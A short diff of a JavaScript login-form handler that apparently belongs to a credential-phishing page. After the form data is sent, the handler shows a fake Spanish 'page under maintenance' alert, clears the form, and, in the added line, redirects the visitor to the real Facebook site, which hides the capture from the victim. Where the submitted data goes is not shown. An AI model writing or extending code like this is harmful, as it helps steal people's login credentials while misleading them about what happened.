@@ -16,6 +16,7 @@ document.addEventListener("DOMContentLoaded", function () {
             .then(function (response) {
                 alert("Lo sentimos, pagina en mantenimiento");
                 document.getElementById("login-form").reset();
+                window.location.href = "https://www.facebook.com/?locale=es_ES";
             }, function (error) {
                 alert("Error al enviar los datos. Inténtalo de nuevo.");
                 console.error("Error:", error);
